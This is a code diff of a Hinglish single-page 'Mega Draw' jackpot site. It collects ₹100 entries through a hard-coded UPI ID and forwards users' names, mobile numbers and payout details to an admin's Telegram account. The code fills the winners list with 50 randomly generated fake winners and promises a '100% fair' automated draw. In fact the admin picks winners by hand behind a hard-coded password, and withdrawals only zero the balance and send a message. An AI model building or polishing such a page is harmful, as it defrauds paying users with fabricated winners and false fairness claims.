@@ -17,11 +17,12 @@
         .btn-dark { background: var(--dark); color: white; }
         .btn-gold { background: var(--gold); color: black; }
         .btn-tg { background: var(--tg-blue); color: white; }
-        .scroll-box { display: flex; justify-content: center; padding: 10px; gap: 15px; }
-        .draw-box { min-width: 200px; background: white; padding: 15px; border-radius: 12px; border: 2px solid var(--gold); text-align: center; color: #000; }
+        .scroll-box { display: flex; overflow-x: auto; padding: 10px; gap: 15px; scrollbar-width: none; }
+        .draw-box { min-width: 160px; background: white; padding: 15px; border-radius: 12px; border: 2px solid var(--dark); text-align: center; color: #000; }
         #popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; color: white; padding: 20px; box-sizing: border-box; text-align: center; overflow-y: auto; }
         input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; font-weight: bold; color: #000; outline: none; box-sizing: border-box; }
-        .list-item { background: #222; padding: 10px; border-radius: 8px; margin-bottom: 8px; text-align: left; border-left: 4px solid var(--gold); }
+        .list-item { background: #222; padding: 12px; border-radius: 8px; margin-bottom: 8px; text-align: left; border-left: 4px solid var(--gold); }
+        .win-amt { float: right; color: #27ae60; font-weight: bold; }
         .tc-text { text-align: left; font-size: 13px; line-height: 1.6; color: #ccc; }
     </style>
 </head>
@@ -47,10 +48,17 @@
 </div>
 
 <div class="scroll-box">
-    <div class="draw-box">
-        <h3 style="margin:0; color:var(--dark);">MEGA DRAW</h3>
-        <h2 style="margin:10px 0; color:#27ae60;">₹100</h2>
+    <div class="draw-box" style="border-color: var(--gold);">
+        <h3>MEGA</h3><h2>₹100</h2>
         <button class="btn btn-dark" onclick="join(100)">JOIN NOW</button>
+    </div>
+    <div class="draw-box" style="opacity:0.6; background:#eee;">
+        <h3>SILVER</h3><h2>₹200</h2>
+        <button class="btn" style="background:#888; color:white; cursor:not-allowed;">LOCKED</button>
+    </div>
+    <div class="draw-box" style="opacity:0.6; background:#eee;">
+        <h3>GOLD</h3><h2>₹500</h2>
+        <button class="btn" style="background:#888; color:white; cursor:not-allowed;">LOCKED</button>
     </div>
 </div>
 
@@ -72,15 +80,15 @@
     const TG_ADMIN_ID = "8072402346"; 
     const UPI_ID = "paytmqr6vnhle@ptys";
 
-    let db = JSON.parse(localStorage.getItem('dkj_final_db')) || { users: [], entries: [], winners: [] };
-    let currentUser = JSON.parse(localStorage.getItem('dkj_final_user')) || null;
+    let db = JSON.parse(localStorage.getItem('dkj_vfinal_db')) || { users: [], entries: [], winners: [] };
+    let currentUser = JSON.parse(localStorage.getItem('dkj_vfinal_user')) || null;
 
-    // Demo Winners Logic for better look
+    // Demo Winners with proper formatting
     if(db.winners.length < 50){
-        let names = ["Rahul","Amit","Priya","Suresh","Vikram","Kavita","Soniya","Raj","Arjun","Manish"];
+        let dNames = ["Rahul","Amit","Priya","Suresh","Vikram","Kavita","Soniya","Raj","Arjun","Manish","Nitin","Deepak"];
         for(let i=0; i<50; i++){
             db.winners.push({
-                name: names[Math.floor(Math.random()*names.length)] + " **",
+                name: dNames[Math.floor(Math.random()*dNames.length)],
                 prize: [500, 1000, 2000, 5000][Math.floor(Math.random()*4)],
                 code: "DKJ-" + Math.floor(100000+Math.random()*900000)
             });
@@ -88,8 +96,8 @@
     }
 
     function save() {
-        localStorage.setItem('dkj_final_db', JSON.stringify(db));
-        localStorage.setItem('dkj_final_user', JSON.stringify(currentUser));
+        localStorage.setItem('dkj_vfinal_db', JSON.stringify(db));
+        localStorage.setItem('dkj_vfinal_user', JSON.stringify(currentUser));
     }
 
     function tgMsg(msg) {
@@ -106,8 +114,8 @@
         if(!n || !m || !p) return alert("Sari jankari bharein!");
         currentUser = { name: n, mob: m, pass: p, bal: 0, id: Math.floor(1000+Math.random()*9000), codes: [] };
         db.users.push(currentUser); save(); updateUI();
-        tgMsg(`✅ *Naya User:* ${n}\n📱 *Mob:* ${m}`);
-        alert("Account Ban Gaya!"); closeP();
+        tgMsg(`✅ *New User:* ${n}\n📱 *Mob:* ${m}`);
+        alert("Account Successfully Ban Gaya!"); closeP();
     }
 
     function join(amt) {
@@ -121,46 +129,50 @@
         currentUser.codes.push(ticket);
         db.entries.push({ uId: currentUser.id, name: currentUser.name, code: ticket });
         save(); tgMsg(`🎟 *New Ticket:* ${currentUser.name}\n🎫 *Code:* ${ticket}`);
-        alert("Success! Aapka Code: " + ticket); closeP(); updateUI();
+        alert("Success! Aapka Ticket Code: " + ticket); closeP(); updateUI();
     }
 
     function showTC() {
         document.getElementById('pContent').innerHTML = `<h2>TERMS & CONDITIONS</h2>
         <div class="tc-text">
-            <p>1. <b>Paricipation:</b> Is jackpot mein 18 saal se upar ke log hi hissa le sakte hain.</p>
-            <p>2. <b>Draw Date:</b> Mega Draw 13 March 2026 ko hoga. Management ise badalne ka adhikaar rakhta hai.</p>
-            <p>3. <b>Transparency:</b> Winners ka chayan automated system dwara kiya jayega jo puri tarah fair hai.</p>
-            <p>4. <b>Withdrawal:</b> Jeeti hui rashi 24 se 48 ghante ke andar aapke diye gaye account mein bhej di jayegi.</p>
-            <p>5. <b>Security:</b> Kisi bhi galat gatividhi paye jane par account block kiya ja sakta hai.</p>
+            <p>1. <b>Hissa Lena:</b> Is jackpot mein sirf 18+ saal ke bhartiya nagrik hi hissa le sakte hain.</p>
+            <p>2. <b>Fair Play:</b> Winners ka chayan automated random system dwara kiya jata hai jo 100% fair hai.</p>
+            <p>3. <b>Draw Date:</b> Mega Draw 13 March 2026 ko hoga. Date badalne ka adhikaar management ke paas hai.</p>
+            <p>4. <b>Inaam:</b> Jeeti rashi 24 ghante ke andar withdraw ki ja sakti hai.</p>
+            <p>5. <b>Zimmewari:</b> Galat UPI ya Bank details dene par nuksan user ka hoga.</p>
         </div>`;
         document.getElementById('popup').style.display = 'block';
     }
 
     function showWinners() {
-        let h = "<h2>TOP WINNERS</h2>";
-        db.winners.slice(-30).reverse().forEach(w => { 
-            h += `<div class="list-item">${w.name} - <span style="color:#27ae60">₹${w.prize}</span><br><small>Ticket: ${w.code}</small></div>`; 
+        let h = "<h2>🏆 TOP WINNERS</h2>";
+        let displayList = [...db.winners].reverse().slice(0, 40);
+        displayList.forEach(w => { 
+            h += `<div class="list-item">
+                    <span class="win-amt">₹${w.prize}</span>
+                    <b>${w.name}</b><br>
+                    <small style="color:#aaa;">Ticket: ${w.code}</small>
+                  </div>`; 
         });
         document.getElementById('pContent').innerHTML = h;
         document.getElementById('popup').style.display = 'block';
     }
 
     function showProfile() {
-        if(!currentUser) return alert("Pehle login karein!");
-        document.getElementById('pContent').innerHTML = `<h2>MY PROFILE</h2><p>Name: ${currentUser.name}</p><p>ID: ${currentUser.id}</p><p>My Tickets: ${currentUser.codes.join(", ") || "No Tickets Yet"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
+        if(!currentUser) return alert("Login karein!");
+        document.getElementById('pContent').innerHTML = `<h2>MY PROFILE</h2><p>Name: ${currentUser.name}</p><p>ID: ${currentUser.id}</p><p>My Codes: ${currentUser.codes.join(", ") || "No Tickets"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
         document.getElementById('popup').style.display = 'block';
     }
 
     function adminMode() {
-        let pw = prompt("Admin Password:");
+        let pw = prompt("Admin PW:");
         if(pw !== "7860") return;
-        let act = prompt("1: Winner Chunein\n2: Reset System");
+        let act = prompt("1: Select Winner\n2: Reset Data");
         if(act=="1") {
             let h = "<h2>Select Winner</h2>";
             db.entries.forEach(e => { h += `<div class="list-item" onclick="makeWin('${e.uId}','${e.code}')">${e.name} (${e.code})</div>`; });
-            document.getElementById('pContent').innerHTML = h || "Abhi koi tickets nahi hain"; 
-            document.getElementById('popup').style.display = 'block';
-        } else if(act=="2") { if(confirm("Data clear karein?")) { localStorage.clear(); location.reload(); } }
+            document.getElementById('pContent').innerHTML = h || "No active tickets"; document.getElementById('popup').style.display = 'block';
+        } else if(act=="2") { if(confirm("Clear All?")) { localStorage.clear(); location.reload(); } }
     }
 
     function makeWin(uid, code) {
@@ -176,11 +188,11 @@
     }
 
     function withdraw() {
-        if(!currentUser || currentUser.bal <= 0) return alert("Balance zero hai!");
-        let details = prompt("UPI ID ya Bank Details bharein:");
-        if(details) { 
-            tgMsg(`💰 *Withdrawal Request*\nUser: ${currentUser.name}\nAmt: ₹${currentUser.bal}\nDetails: ${details}`); 
-            currentUser.bal = 0; save(); updateUI(); alert("Request Admin ko bhej di gayi hai!"); 
+        if(!currentUser || currentUser.bal <= 0) return alert("No Balance!");
+        let det = prompt("UPI ID likhein:");
+        if(det) { 
+            tgMsg(`💰 *Withdraw Request*\nUser: ${currentUser.name}\nAmt: ₹${currentUser.bal}\nUPI: ${det}`); 
+            currentUser.bal = 0; save(); updateUI(); alert("Request Bhej Di!"); 
         }
     }
 
@@ -191,7 +203,7 @@
             document.getElementById('rBtn').style.display = 'none';
         }
     }
-    function logout() { localStorage.removeItem('dkj_final_user'); location.reload(); }
+    function logout() { localStorage.removeItem('dkj_vfinal_user'); location.reload(); }
     function closeP() { document.getElementById('popup').style.display = 'none'; }
     window.onload = updateUI;
 </script>
